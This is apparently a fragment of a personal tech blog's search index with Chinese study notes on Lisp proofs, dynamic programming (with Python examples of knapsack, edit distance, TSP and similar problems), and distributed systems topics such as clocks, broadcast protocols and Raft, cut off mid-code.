(wt (car x))) (wt (cdr x))))        (&lt; (wt (rotate x)) (wt x))))\n=&gt; if-true, natp/wt\n(if (atom x)    &#x27;t    (if (atom (car x))        (if (natp (wt (cdr x)))            (&lt; (wt (cdr x)) (+ (+ (wt (car x)) (wt (car x))) (wt (cdr x))))            t)        (&lt; (wt (rotate x)) (wt x))))\n=&gt; identity-+, common-addends-&lt;\n(if (atom x)    &#x27;t    (if (atom (car x))        (if (natp (wt (cdr x)))            (&lt; 0 (+ (wt (car x)) (wt (car x)))))            t)        (&lt; (wt (rotate x)) (wt x))))\n=&gt; change promise (natp (wt (cdr x))) -&gt; t -&gt; (equal (&lt; ‘0 (wt x))) t)\n(if (atom x)    &#x27;t    (if (atom (car x))        (if (&lt; ‘0 (wt (car x))))            (&lt; 0 (+ (wt (car x)) (wt (car x)))))            t)        (&lt; (wt (rotate x)) (wt x))))\n=&gt; positive-+\n(e04, 後面的很長，pass)\n最後還有一個align/align，但就是之前的綜合體，不過歸納template要自己生，至於證明就不展開了太長了!!\n(defun align (x)    (if (atom x)        x        (if (atom (car x))            (cons (car x) (align (cdr x)))            (align (rotate x)))))(dethm align/align (x)    (equal (align (align x)) (align x)))(if (atom x)    (equal (align (align x)) (align x))    (if (atom (car x))        (if (equal (align (align (cdr x))) (align (cdr x)))            (equal (align (align x)) (align x)) &#x27;t)        (if (equal (align (align (rotate x))) (align (rotate x)))            (equal (align (align x)) (align x))            &#x27;t)))\nJ-Bob\nTODO\n有時間會補!!\n","categories":["Lisp","Reading"]},{"title":"Dynamic programming","url":"/2021/11/dynamic%20programing/","content":"動機\n寫個dp的總結，個人不喜歡課本上的什麼最佳子結構什麼的，所以不會有那種名詞\n只要懂遞迴就可以做dp了\n對了，遞迴的函式預設有@cache，做記憶法\n\nDP概述\nDynamic programming = planning over time\n這裡的time要理解成順序，我們是在每個時間點上做決策，所以通常會需要資料有sort過或是本身有一定的順序\n這些順序就是其他講解DP的資料會看提到的階段\nDP 與 backtracking\nWeighted interval scheduling: 每個job有weight挑job不重疊，並讓wieght最大\n假設有job都已開始時間排序好，同時有一個函數(prev)可以給出前一個離最近的job\n那就可以給出一個dp，就是看要不要這份job\nf(i)表示選到i時的最大wieght總和\n@cachedef f(i):  if i == 0:    return jobs[i]  else:    return max(f(i-1), jobs[i]+f(prev[i]))\nsubset: 求subset\n每一個都可以選或不選\ndef subset(arr):  if not arr:    return [[]]  else:    sub = subset(arr[1:])    return sub+[s + [arr[0]] for s in sub]\n可以看出dp與backtracking都是選與不選!!\n那兩者差在哪裡?\nbacktrack需要之前的所有資料\ndp可以利用有結合律函數(min, max, sum…)把之前的所有資料用一筆代表\n不只一種DP\nWeighted interval scheduling也可以這樣看\n定義f(i,time)為在選第i樣工作，從time之前都有空\ndef f(i, time):  if i == 0:    return jobs[i]  elif end[i] &gt; time:    return f(i-1)  else:    return max(f(i-1, time), jobs[i]+f(i-1, start[i]))\ndp其實主要牽涉到怎麼設定狀態，像是把時間放進來，就會變成不同的dp\n但前面利用前處理，讓找下一個job的速度上去，進而減少一個維度(參數)\nDP 與 greedy\n\nGreedy 不行就 DP\n\n當 Greedy 不對就代表\n「這個問題不能只由這個子問題轉移」\n換句話說，Greedy 就是可以證明只有一個轉移來源的 DP\n可以順便看列舉為什麼慢?\n因為除了現在確定的參數外，還要繼續往後看才能確定答案\n貪心就是只看當下，就ok了\nDP是除了現在還要加上以前的資料\n證明greedy\n因為貪心就是只看當下，所以會需要證明這做法是對的\n\n反證法：如果交換方案中任意兩個元素/相鄰的兩個元素後，答案不會變得更好，那麼可以推定目前的解已經是最優解了。\n歸納法：先算得出邊界情況（例如 ）的最優解 ，然後再證明：對於每個 ， 都可以由  推導出結果。\n\n常見題型\n\n「我們將 XXX 按照某某順序排序，然後按某種順序（例如從小到大）選擇。」。\n\n離線，先處理後選擇\n\n\n「我們每次都取 XXX 中最大/小的東西，並更新 XXX。」\n\n（有時「XXX 中最大/小的東西」可以優化，比如用優先隊列維護）\n在線，邊處理邊選擇\n解法\n\n\n排序解法\n\n用排序法常見的情況是輸入一個包含幾個（一般一到兩個）權值的數組，通過排序然後遍歷模擬計算的方法求出最優值。\n\n\n後悔解法\n\n思路是無論當前的選項是否最優都接受，然後進行比較，如果選擇之後不是最優了，則反悔，捨棄掉這個選項；否則，正式接受。如此往復。\n\n\n\nDP 與 DAG\nDP的狀態可以看成graph上的點\n同時這個graph不會有環，所以是DAG\n這樣DP其實就是求DAG的最長/短距離\nrecursion &amp; iteration\niteration其實是recursion的特例\niteration，是直接從base case直接往上做，對應到bottom-up\nrecursion與iteration差在recursion要記憶當初誰call的context(用stack)\n之後從頭往下，到底(base case)就照著stack往回走，這就是top-down\n如果遞迴call的當下沒有其他要做的事，其實這個遞迴就是iteration\n有context: sum(arr[1:])處理完還要與arr[0]的相加\ndef sum(arr):  if not arr:    return 0  else:    return arr[0]+sum(arr[1:])\n沒context: sum(arr[1:],acc+arr[0])做完就沒有其他事了\ndef sum(arr,acc=0):  if not arr:    return acc  else:    return sum(arr[1:],acc+arr[0])\n所以上面那個版本其實就是iteration，不過需要tail-recursion elimiation優化才有iteration的實際效能\ntop-down &amp; bottom-up\n\ntop-down &amp; bottom-up 不等價\nLeetcode 718\n如果用top-down，因為要追蹤每個range的長度，所以變成n^3\n但是用bottom-up，長度自然是對的，所以變成n^2\nLeetcode 546\n只能用top-down去做，因為很難確定base case與怎麼從base case長上去\n反倒是top-down的分解，就很好做\n技巧\n狀態壓縮\n其實就是把應該用set或array表示的狀態用bitmask表示\n因為是bitmask，所以是整數，是整數就能dp\n刷表法\n\n\n省mem，locality變好\nDP優化 (我不會，這個只會出現在競程)\n太可怕了，就把資料列一列就好\n分治、DP 進階\nAliens 優化\n進階DP，DP優化\n寫的小技巧\n\n產生新值時固定寫法\n\n有的是f[n + x] = combine(f[n], ....)\n有的是f[n] = combine(f[n - x], ....)\n最好固定寫法，個人是喜歡\n\nf[n] = combine(f[n - x], ....)\n因為dp一定是由小的更新大的\n\n\n\n\nbottom-up或是改寫時可以畫圖輔助\n\n狀態怎麼到起點 (參數怎麼變化)\n在table上是取什麼點 (方向)\n\n\n從終點開始思考怎麼到起點 (top-down開始做)\n\n除非bottom-up很明顯，或是top-down在這題是個悲劇\n\n\n\n設計方式\ndp就是由參數(遞迴的模型的組合)、對應的動作構成、定義回傳值，只能在求最佳化問題(有結合律的函數)使用\n遞迴的模型\n\n線性 (1D)\n\nf(i) = combine(f(j) for j in range(i))\n\n\n區間 (2D)\n\n列舉中點\n\nf(i,j) = combine(combine2(f(i,k), f(k,j)) for k in range(i,j))\n\n\n控制左右\n\nf(i,j) = combine(f(i-1,j), f(i,j-1))\n\n\n分塊\n\nf(i,j) = combine(f(i,a), f(a,b), f(b,j)) for (a,b) in ...\n\n\n\n\n點 (2D)\n\n上、左、左上\n\nf(i,j) = combine(f(i-1,j), f(i,j-1), f(i-1,j-1))\n\n\n\n\n樹\n\n子樹\n\nf(root) = combine(f(child) for child in root.children)\n\n\n\n\nset(狀態壓縮)\n\nf(state) = combine(f(next(state)))\n\n\n\n上面是可能的遞迴方式，除了遞迴外，還有其他需要的訊息，像是座標、成本等等\n需要遞迴的，加上其他需要的訊息，就是dp的狀態\n動作\n這就是看題目了，像是edit distance就有delete、replace、insert\n動作會影響到\n\n子問題怎麼組合\n參數怎麼變化\n有什麼參數\n\n定義回傳值 (成本)\ndp回來的值一定是可以與其他dp組合在一起的值，像\n\n最大最小\n總和\n長度\n…\n\n通常我們會知道怎麼算最終答案的成本，但是dp時會需要計算當下狀態成本的方式，也就是需要把成本計算分散到每一層\n這個吃狀態怎麼設計 以及 觀察\n範例可以看Optimal binary search trees的depth怎麼處理的\n多看看其他人怎麼做\n設計dp有的時候要自己加維度，就如同前面看到的dp不只一種，端看設計與實作\n所以其實寫dp最重要的是觀察與想像，所以多做題\n特別的DP\n背包\n01背包:\n選到i，剩下space個空間\ndef f(i,space):  if space &lt; 0:    return float(&#x27;-inf&#x27;)  elif i &lt; 0:    return 0  else:    return max(f(i-1,space), price[i]+f(i-1, space-cost[i])) # !!\n無限背包:\ndef f(i,space):  if space &lt; 0:    return float(&#x27;-inf&#x27;)  elif i &lt; 0:    return 0  else:    return max(f(i-1,space), price[i]+f(i, space-cost[i])) # !!\n滾動 &amp; 從頭或從尾\n注意到i都是只有i-1，所以可以用滾動，但要改寫成bottom-up\n01背包:\n這裡與原本top-down的差不多，從i往前推\ndp = [0] * Wfor p,w in items:  for nowW in reversed(range(w, W+1)):    dp[nowW] = max(dp[nowW], p+dp[nowW-w])\n無限背包:\n這裡就與top-down完全不同了!!\ntop-down還是，從i往前推，但是可以在i停留，達成無限的效果\nbottom-up為了要無限，所以必須每個合法的空間都要加一次，同時還要包含前面的影響\ndp一定是小的先算好，所以一定從前面取，而現在我們想取的值是已經改變過的值，所以要從最小的空間開始往上推\n01背包是不想取到已經改變過的值，所以要從最大的空間往下推\n這裡也彰顯了從頭與從尾的不同!!\n能不能拿到已經改變過的值?\n\n從頭: 能\n從尾: 不能\n\ndp = [0] * Wfor p,w in items:  for nowW in range(w, W+1):    dp[nowW] = max(dp[nowW], p+dp[nowW-w])\n有環的DP\n\n做離散化，每個點做一次\n把環的長度變成兩倍\n\nmutual recursion\nLeetcode 188\n最多賣k次，買完才能賣，求最大收益\nsell[i][k] = 第i天，剩k次，做賣的最大收益buy[i][k] = 第i天，剩k次，做買的最大收益\ndef sell(i,k):  if k &lt;= 0 or i &lt; 0:    return 0  else:    return max(sell(i-1,k), price[i]+buy(i-1,k-1))def buy(i,k):  if k &lt;= 0 or i &lt; 0:    return float(&#x27;-inf&#x27;)  else:    return max(buy(i-1,k), -price[i]+sell(i-1,k-1))\n為什麼要兩個?\nbuy有自己的收益，sell也有自己的收益\n彼此又互相組成對方的收益\n範例\n來自演算法課本的dp範例\nAlgorithm Design(AD): 真的難，但有點東西\nIntroduction to Algorithm(CLRS): 厚到不能墊泡麵與當枕頭\nAlgorithms(DPV): 很薄，很精闢\nThe Algorithm Design Manual(TADM): 就是課本，但可以根據問題屬性去查對應的解法\nedit distance\n\nreplace: (i-1,j-1)\ndelete: (i,j-1)\ninsert: (i-1,j)\n\ninsert多一個字，又馬上比對，所以與delete相反\n\n\n\ndef f(s1,s2):  if not s1 and not s2:    return 0  elif s1[0] == s2[0]:    return f(s1[1:], s2[1:])  else:    return 1+min(f(s1[1:], s2[1:]), f(s1, s2[1:]), f(s1[1:], s2))\nLongest common subsequence &amp; Longest increasing subsequence\nLongest Increasing Subsequence\nMaximum Subarray Sum (AD)\nMaximum Subarray Sum\nTraveling Salesman Problem\n給定一系列城市和每對城市之間的距離，求訪問每一座城市一次並回到起始城市的最短迴路\ncities是還可以去的點，1011，還有2, 1, 0可以去\ni是目前的位置\ndef f(cities, i):  if cities == 0:    return 0  else:    return min([f(cities ^ (1 &lt;&lt; i), j) + weight[i][j] for j in edges[i] if (1 &lt;&lt; j) &amp; cities) != 0], float(&#x27;inf&#x27;))\nHamiltonian Path\n有沒有一條每一點剛好經過一次的路線，起點和終點可以不相同\nN是有幾個地點(len(graph.V()))\nremains是還可以去的點，1011，還有2, 1, 0可以去\ni是目前的位置\ndef f(remains, i):  if remains == 0:    return True  else:    return any(f(remains ^ (1 &lt;&lt; i), j) for j in edges[i] if (1 &lt;&lt; j) &amp; remains) != 0)\nShortest paths (DPV)\npath本身就是一段接一段的，也就是說它本身就是遞迴\n可以回去，所謂的relaxtion，其實就是在原有的基礎上衍伸一段可以到的edge\n這就是list!!\n如果求最短，就是min，是具有結合律的函數，可以dp\n所以可以列舉起、終點、中間點，一直更新最短長度\nRod cutting (CLRS)\n給一條木頭，與長度對應到的價格，求最大收益\ndef f(size):  if size == 0:    return 0  else:    return max(f(size-sub)+price for sub,price in size2price.items() if size-sub &gt;= 0)\nMatrix-chain multiplication (CLRS, DPV)\n有一排matrix要乘，求計算成本最小\n成本: (a X b) * (b X c) = (a X c) 的 成本是 b\ndef f(i,j):  if j-i &lt;= 1: # 不會有一個matrix相乘    return float(&#x27;inf&#x27;)  else:    return min(f(i,k)+f(k+1,j)+cost(k,k+1) for k in range(i+1, j-1))\nOptimal binary search trees (CLRS)\n給key與出現的頻率，組成一個搜尋成本最小的BST\n成本: sum(freq[i]*depth)\n一個是tree，所以要分左右\n一個是範圍，所以有i,j\n再來是計算成本，所以先把depth傳進去\ndef f(i,j,dep):  if j-i == 0:    return 0  else:    return min(f(i,k,dep+1)+f(k+1,j,dep+1)+freq[key[k]] * dep for k in range(i,j-1))\n有沒有辦法把depth消滅掉?\n看成橫的\n先看tree\n      i   i-1 i+1i-2        i+2\n再看當時遞迴的範圍\n              [i-2~i+2]     [i-2~i-1]         [i+1~i+2][i-2]                           [i+2]\n以i+2來說，由上往下看被加了3次，只看遞迴時的範圍，會發現剛好都i+2出現了3次\n所以可以把depth去掉，變成每一次就把整個遞迴範圍的freq加總就好\ndef f(i,j):  if j-i == 0:    return 0  else:    return min(f(i,k)+f(k+1,j)+sum(freq[i:j]) for k in range(i,j-1))\nMinimum Length Triangulation (TADM)\n有一堆點，構成一個多邊形，把多邊形切成三角形，讓成本最小\n成本: 所有三角形邊長的總和\ndef dist(p1, p2):    return sqrt((p1[0] - p2[0])*(p1[0] - p2[0]) + (p1[1] - p2[1])*(p1[1] - p2[1])) def cost(points, i, j, k):    return dist(points[i], points[j]) + dist(points[j], points[k]) + dist(points[k], points[i])def f(i,j):  if j-i &lt;= 2:    return float(&#x27;inf&#x27;)  elif j-i == 3:    return cost(i,i+1,j)  else:    return min(f(i,k) + cost(i,k,j) + f(k,j) for k in range(i,j))\nIndependent sets in trees (DPV)\nIndependent set就是裡面的點沒有edge互連，求最多點的set\n就是選了root就不能選children，但可以加上grand-children\nf(root) = max(sum(f(children)), 1+sum(grand-children))\nMaximum Rectangle Problem (AD)\n給個matrix，求從中框出的長方形的內部數字總和\n先做row的prefix sum\n再根據前面的prefix sum，做每個column的prefix sum\n之後就是用排容: f(i,j,n,m) = area(i,j) - area(i-n,j) - area(i,j-m) + area(i-n, j-m)\nSegmented least squares (AD)\n有一堆點，要用最少的線去fit這些點\n定義回傳值: cost\n定義cost: 每個點的e + 常數*幾根線\n用到Optimal binary search trees把depth分散到每一層去做的技巧\ndef error(i,j):  # Check 6. DYNAMIC PROGRAMMING I page 30  passdef f(i):  if i == 0:    return 0  else:    return min(error(k,i) + 常數 + f(k-1) for k in range(i))\nFind the longest path in a matrix with given constraints\n這裡要注意的是沒有去重的東西，所以開始dfs時要從終點開始走\ndef path(i,j):    ret = float(&#x27;-inf&#x27;)    if 0 &lt;= i &lt; n and 0 &lt;= j &lt; m:        if (i,j) == (n-1,m-1):            ret = 0        else:            dirs = [(i-1,j),(i,j-1),(i+1,j),(i,j+1)]            ret = max(ret, *[path(x,y) for (x,y) in dirs])    return retfor i in reversed(range(n)):    for j in reversed(range(m)):        path(i,j)\nAssembly Line Scheduling\ndag最長路徑\n# t :: time to switch another line# a :: time of each station# e :: cost on starting line# x :: cost on goaldef f(i,j):    if j == 0:        return e[i] + a[i][j]    ret = min(f(i,j-1), t[int(not i)][j-1]+f(int(not i), j-1))    if j == len(t[0]): # at goal        ret += x[i]    return ret\nOptimal Strategy for a Game\n一開始先用一個me表示對面在做決策\n有點像買股票的那一提\ndef f(i,j,me):    if i&gt;j:        return 0    elif i==j:        return arr[i] if me else 0    else:        if me:            # ????            return max(arr[i]+f(i+1,j,not me), arr[j]+f(i,j-1,not me))        else:            # ????\nQ: 看別人的分數幹嘛\nA: 雖然說我們的結果與他們有關，但是他的分數與我們無關\n下面的也是類似的\ndef x(i,j):    if i&gt;j:        return 0    elif i == j:        return arr[i]    else:        return max(arr[i]-y(i+1,j), arr[j]-y(i,j-1))def y(i,j):    if i&gt;j:        return 0    elif i == j:        return arr[i]    else:        return max(arr[i]-x(i+1,j), arr[j]-x(i,j-1))\n選下一輪能選的時候分數最少的case (關注要建構的目標)\ndef f(i,j):    if i&gt;j:        return 0    elif i == j:        return arr[i]    else:        return max(arr[i]+min(f(i+2, j), f(i+1,j-1)), arr[j]+min(f(i,j-2), f(i+1,j-1)))\nPartition problem\ndef f(i,cnt):    if i == 0:        return arr[i] == cnt    else:        return f(i-1,cnt-arr[i]) or f(i-1,cnt)return f(len(arr)-1, sum(arr)//2) if sum(arr) % 2 == 0 else False\nPartition a set into two subsets such that the difference of subset sums is minimum\n這個會變成backtrack\ndef f(i, cnt):    if i == 0:        return abs((sum(arr) - cnt) - cnt)    else:        return min(f(i - 1, cnt+arr[i - 1]), f(i - 1, cnt))\n原因是f想直接算差值，但是差值一定要等到最後，把所有路都走過\n可以對其中一個維度做離散化\ndef f(i, cnt):    if i == 0:        return cnt == 0    else:        return f(i-1, cnt) or f(i-1,cnt-arr[i])for n in reversed(range(sum(arr)//2)):    if f(len(arr)-1, n):        print(sum(arr)-2*n)\n題外話: functional DP\n函数式的动态规划\nRef\nGreedy &amp; DQ &amp; DP\n夜深人静写算法（二）- 动态规划入门\n6. DYNAMIC PROGRAMMING I\n背包 DP\n","categories":["Algorithm","Tips"]},{"title":"Distributed computing","url":"/2022/01/Distributed-computing/","content":"動機\n論選好課、書的重要性\n\nModels of distributed systems\n\n\n\n怎麼處理上面會騙人的狀況?\n只有兩人無法判斷對錯，所以如果有一個壞人，就要有兩個好人，才能抵銷\n\n剛剛的兩個問題都有兩項東西\n\nNode\nNetwork\n\n還有另一個要考慮的是 latency!!\n\n\nsystem model是由下面3項組成\n\nNetwork behaviour (e.g. message loss)\n\n(assume) bidirectional point-to-point communication\n\nReliable (perfect) links\n\n如果收到msg，就代表他有被送出\n可能重排\n\nFair-loss links + retry&amp;消除重複\n\n\n\n\nFair-loss links\n\nmsg可能消失、重複、重排\n但一直try總會到對面去\n\nArbitrary links + TLS\n\n\n\n\nArbitrary links\n\n中間有不懷好意的人\n\n\n\n\nNetwork partition\n\n線路會drop或是delay\n\n\n\n\nNode behaviour (e.g. crashes)\n\n如果出事(faulty)的話\n\nCrash-stop (fail-stop)\n\ncrash就直接停下來\n\n\nCrash-recovery (fail-recovery)\n\ncrash會失去mem中的狀態\n在一段時間之後會自己復原\n\n\nByzantine (fail-arbitrary)\n\ncrash後什麼事都有可能發生\n\n\n\n\n\n\nTiming behaviour (e.g. latency)\n\nNode &amp; Network\n\nSynchronous\n\nlatency有上限\nnode的執行速度是可以預估的\n\n\nPartially synchronous\n\n有些部分是async的(會結束，但不知道多久)\n其他都是sync\n\n\nAsynchronous\n\nlatency不確定\nnode也不確定會不會隨時停下\n\n\n\n\nNode的意外\n\nOperating system scheduling (priority inversion)\nStop-the-world garbage collection\nPage faults, swap, thrashing\n\n\nNetwork的意外\n\nMessage loss requiring retry\nCongestion/contention causing queueing\nNetwork/route reconfiguration\n\n\n\n\n\n\n\nFailure: system完全不動\n\n\nFault: 一部份不動了\n\nnode\n\ncrash (crash-stop/crash-recovery)\ndeviating from algorithm (Byzantine)\n\n\nNetwork\n\ndropping or significantly delaying messages\n\n\n\n\n\nFailure detectors\n\nPerfect failure detector\n\nlabels a node as faulty iff it has crashed\n\n\nTypical implementation\n\nsend message\nawait response\nlabel node as crashed if no reply within some timeout\n\n\nProblem\n\n不能區分是\n\ncrashed node\ntemporarily unresponsive node\nlost message\ndelayed message\n\n\n所以只能在\n\nsynchronous crash-stop system with reliable links\nEventually perfect failure detector\n\ntemporarily\n\n標成 crashed, 就算是 correct\n標成 correct, 就算是 crashed\n\n\neventually\n\n標成 crashed, iff crashed\n\n\n\n\n\n\n\n\n\n\n\nTime, clocks, and ordering of events\n\ntwo types of clock\n\nphysical clocks\n\n就是時間，數花掉的時間\n會有誤差 (可能在調整時變大變小)\n\nCoordinated Universal Time (UTC)\n\nUTC 是由 TAI 配合地球自轉速度做修正\n\nInternational Atomic Time(TAI): from 原子鐘\n地球自轉速度不是常數\n\n\n\n\nLeap seconds\n\n在 on 30 June and 31 December at 23:59:59 UTC\n\nnegative leap second: 直接跳過去\npositive leap second: 跳到 23:59:60等1秒，再跳過去\n\n\n\n\ntimestamps格式\n\nUnix time: number of seconds since 1 January 1970 00:00:00 UTC\n\n不算Leap seconds\n\n\nISO 8601: year, month, day, hour, minute, second, and timezone offset relative to UTC\n\n2020-11-09T09:50:17+00:00\n\n\n\n\nNTP\n\nClock skew: 兩個clock的差\n作法\n\n\n對多台server取樣，跑算式\n\n\n\n\n\n開始調時間\n\n\n\n\n\n\n\n\nTime-of-day clock\n\n從某個時間點開始\n適合比較\n可能會變動 (NTP矯正)\n\n\nMonotonic clock\n\n隨便一個點開始\n適合計算花費的時間\n\n\n\n\n\n\n\n\n\n\nlogical clocks\n\n用來數有多少事件\n單調遞增\nhappens-before relation (就是有向圖的path)\n\n定義\n\n同一個process\n\na發生在b之前\n\n\n不同process\n\na送msg，b收到\n\n\n遞移律\n\na -&gt; b -&gt; c: a -&gt; c\n\n\n\n\n就是有向圖的path\n\npartial order\n\n\nconcurrent: 不是 a -&gt; b 或 b -&gt; a\n\na || b\n\n\n\n\n\nCausality\n\nconcurrent代表兩者一定沒有因果關係\n有hb就是可能有因果關係\n定義\n\na strict total order on events\n\n\n\n\n\n\n\n\n\n\nBroadcast protocols and logical time\n\n\ncapture causal dependencies\n\nNo Physical timestamps!!\ntwo types of logical clocks\n\nLamport clocks\n\n作法\n\n每個process init自己的時間\n\nt = 0\n\n\n有event發生\n\nt++\n\n\nsend某個m\n\nt++\nsend((t, m))\n\n\nrecv到某個(tx, m)\n\nt = max(tx, t) + 1\n對m做事\n\n\n\n\nProperties\n\nL是取t的函數、N是取在哪個process的函數\n\n\n\nthe pair (L(e), N(e)) uniquely identifies event e\n用Lamport clocks定義total order\n\n\n\n\nBUT\n\n不同process的timestamp可能會一樣!!\n\n不能分辨 a -&gt; b 或是 a || b\n\n因為把自己與其他人的時間混在一起了\n\n\n\n\n\n\n\n\nVector clocks\n\n作法\n\n每個process(假設叫i) init自己的時間\n\nt = [0] * len(procs)\n\n\n有event發生\n\nt[i]++\n\n\nsend某個m\n\nt[i]++\nsend((t, m))\n\n\nrecv到某個(tx, m)\n\nt = [max(t[j], tx[j]) if j != i else t[i]+1 for j in range(len(procs))]\n對m做事\n\n\n\n\n用Vector clocks定義total order\n\n\n\n\n\n\n\n\n\n\n\n\nBroadcast protocols\n\n\nbroadcast的種類\n\nFIFO\n\n從同一個process出來的msg，收到msg的順序，與送的順序一樣\n\n\nvaild order: (m1一定在m3前面，其他隨便)\n\n(m2, m1, m3)\n(m1, m2, m3)\n(m1, m3, m2)\n\n\n\n\n\n\nCausal\n\nbroadcast(m1) -&gt; broadcast(m2)，那m1一定先收到，之後才是m2\n\n\nvaild order: (m1 -&gt; m2，m1 -&gt; m3)\n\n(m1, m2, m3)\n(m1, m3, m2)\n\n\n\n\n\n\nTotal order\n\n只要m1先收到，在所有process都會是m1先收到\n\n\nvaild order:\n\n(m1, m2, m3)\n\n\n\n\n\n\nvaild order:\n\n(m1, m3, m2)\n\n\n\n\n\n\nFIFO-total order\n\nFIFO + Total order\n\n\n\n\n\nBroadcast algorithms\n\n要處理兩個部分\n\n把best-effort broadcast變成reliable\n\n利用retransmitting\n\n\n保持送(收)的順序\n\n\nNot Reliable (Naive)\n\n直接送到process去\nProblem\n\n送的process中間掛掉怎麼辦\n\n\n\n\nReliable\n\nEager reliable broadcast\n\nprocess只要是第一次收到時就re-boardcast!!\n\n到所有process\n\n\nProblem\n\n總共有O(n^2)個msg在流動!!\n\n\n\n\nGossip protocols\n\nprocess只要是第一次收到時就re-boardcast!!\n\n到3個process (隨機選)\n\n\n適合用在process很多時\nProblem\n\nEventually reaches all nodes (with high probability)\n\n\n\n\n\n\n\n\nFIFO broadcast algorithm\n\n\n重點是在buffer中找有對到自己的delivered的msg才做下一步動作\n\n這樣就是FIFO，從同一個process出來的msg的順序是對的\n\n\n\n\nCausal broadcast algorithm\n\n\n延伸FIFO broadcast algorithm，但\n\n改成vector clock!! (這樣就完成CO了!!)\n\n\n\n\nTotal order broadcast algorithms\n\nSingle leader (轉成BFS tree)\n\n\n會有單點失敗!!\n\n\nLamport clocks (用Lamport clocks排序)\n\n\n怎麼確定我現在拿到的msg是最小的?\n\n要等到每個process的msg的stamp都比較大才會知道\n\n\n\n\n\n\n\n\n\nReplication\n\nUse best-effort broadcast\n\n\nIdempotence\n\n多次操作後不用dedup的操作\nretry behaviour\n\nAt-most-once\n\n不retry\n\n\nAt-least-once\n\nRetry到收到ack\n\n\nExactly-once\n\nRetry +\n\nidempotence\ndeduplication\n\n\n\n\n\n\n就算是idempotence，還是有影響到狀態\n\n所以下面的client2到了最後沒辦法看到移除了client1 add的資料的狀態\n\n\n\n\n\n\nTimestamps and tombstones (soft delete)\n\n\n\n\n\n資料會放一個flag，標有沒有被刪過\n\n\n\n\n\nReconciling replicas\n\n還會放一個timestamp標什麼時候被寫入\n\n\n\n\nConcurrent writes by different clients\n\n\n兩種做法\n\nLast writer wins\n\n取timestamp最大的\n\ntotal order (e.g. Lamport clock)\n\n\n注意 data loss\n\n\nMulti-value register\n\n如果可以比，取最大；不能比，都存\n\npartial order (e.g. vector clock)\n\n\n\n\n\n\n\n\n\n\n\nQuorum (Byzantine problem)\n\nRead-after-write consistency\n\n\n\n\n只要read(read quorum)/write(write quorum)的response有到達指定人數就取這個結果\n\nread quorum + write quorum &gt; nodes\n\n一般取，(nodes+1)/2\n可以在write時忍受nodes-write quorum壞掉，read是nodes-read quorum\n\n\n\n\n\n\n\n\n\nUse Total order broadcast (在每個process中msg的順序都是一樣的!!)\n\nState machine replication\n\nFIFO total order broadcast送update msg: 一定會到、順序一樣\n\n能不能用更弱的broadcast\n\n這樣就沒有順序的保證了!!\n\n但是update的順序如果不影響最後的結果的話\n\ncommutative: f(g(x)) = g(f(x))\n\n\n\n\n\n\n\n\n所以可以把update msg當成map，Replica當成DFA\n\nsame input, same output: deterministic\n\n\n限制\n\n不能馬上更新，要等msg傳遞\n需要 fault-tolerant total order broadcast\n\n\n\n\n\n\n\n\nConsensus\n\nFault-tolerant total order broadcast\n\ntotal order broadcast一定要leader!!\n\nleader壞了怎麼辦?\n\n自己選一個\n\n用failure detector (timeout)看leader壞了沒\n\n壞了就選下一個\n確保只有一個leader\n\n用term區份這個任期中誰是該區市民與leader\n\n需要定義Quorum (過 半+1)\n每個process在每個任期中最多只能投一次票\n\n\n\n這樣可以確保一個任期只有一個leader\n\n\nleader在傳msg之前都要ack，不然怕場面尷尬\n\n\n\n\n\n\n\n\n\n\n\n\n\nConsensus and total order broadcast\n\nConsensus: 大家都同意某一個值\n\ntotal order broadcast: 大家都同意下一個msg要送什麼\n\n\nConsensus and total order broadcast are formally equivalent\n\n\nCommon consensus algorithms: Paxos, Multi-Paxos, Raft\n\n\nDistributed mutual exclusion\n\n作法\n\ncentral lock server\n\nleader是bottleneck\n單點失敗\n\n怎麼重選leader\n\n\n\n\ntoken passing\n\n用一個token去傳(整個要連成一個ring)，拿到就當成拿到lock\n單點失敗\n\n怎麼rebuild ring\n怎麼重生token\n\n\n\n\nTotally ordered multicast\n\n只有一個人held，所以讓所有人投票，要拿到N-1\n\nraft是(N+1)/2\n\n\nconcurrent requests (兩個以上want lock)\n\n\n看pid比大小\n\n哲學家用餐問題!!\n\n\n\n\n\n\n\n\n\n\nConsensus system models\n\n假設system model是\n\npartially synchronous\n\nnot asynchronous (FLP result)\n\nin an asynchronous crash-stop system model\n\nno deterministic consensus algorithm that is guaranteed to terminate\n\n\n\n\nuse clocks only used\n\nfor timeouts/failure detector\n\nto ensure progress\n\n\nnot Safety (correctness)\n\n\n\n\ncrash-recovery\n\n\n\n\nRaft\n\nstate(腳色) 變化\n\n\n\n\n元件\n\nlog: leader傳過的msg 或是 follower收到的msg (array)\n\nmsg\nterm: 傳msg當時的term\n\n\nterm: 任期\n\n主要是看這個\n\n\nsentLength: leader傳了多長的log給follower\nackedLength: follower回報他們的log多長\ncommitLength: 真的有deliver的有多少\n\n\n\n\n\nclass Node:    def __init__(self):        self.init_runtime_state()        self.Term = 0        self.votedFor = None        self.log = []        self.commitLength = 0        self.id = &quot;whatever&quot;            def init_runtime_state(self):        self.Role = &quot;follower&quot;        self.Leader = None        self.votesReceived = set()        self.sentLength = [0]*len(nodes)        self.ackedLength = [0]*len(nodes)    def when_leader_fail_OR_election_timeout(self):        self.Term += 1        self.Role = &quot;candidate&quot;        self.votedFor = self.id        self.votesReceived.add(self.id)        lastTerm = self.log[-1].term if len(self.log) &gt; 0 else 0        for n in nodes:            __send(n, (&quot;VoteRequest&quot;, self.id, self.Term, len(self.log), lastTerm))        __startElectionTimer()        def when_recv_VoteRequest(self, cId, cTerm, CLogLen, cLogTerm):        myLogTerm = self.log[-1].term                isLargeLogTerm = cLogTerm &gt; myLogTerm        inSameLogTerm = myLogTerm == myLogTerm        hasMoreLog = CLogLen &gt;= len(self.log)        logOK = isLargeLogTerm or (inSameLogTerm and hasMoreLog)                isLargeTerm = cTerm &gt; self.Term        inSameTerm = cTerm == self.Term        notVoted_OR_voteSame = self.votedFor in &#123;cId, None&#125;        termOK = isLargeTerm or (inSameTerm and notVoted_OR_voteSame)                if logOK and termOK:            self.Term, self.Role, self.votedFor = cTerm, &quot;follower&quot;, cId            __send(cId, (&quot;VoteResponse&quot;, self.id, self.Term, True))        else:            __send(cId, (&quot;VoteResponse&quot;, self.id, self.Term, False))        def when_recv_VoteResponse(self, vId, vTerm, isAgree):        if self.Role == &quot;candidate&quot; and self.Term == vTerm and isAgree:            self.votesReceived.add(vId)            if len(self.votesReceived) &gt;= (len(nodes)+1)//2:                self.Role, self.Leader = &quot;leader&quot;, self.id                __stopElectionTimer()                for n in &#123;n in nodes if n is not self&#125;:                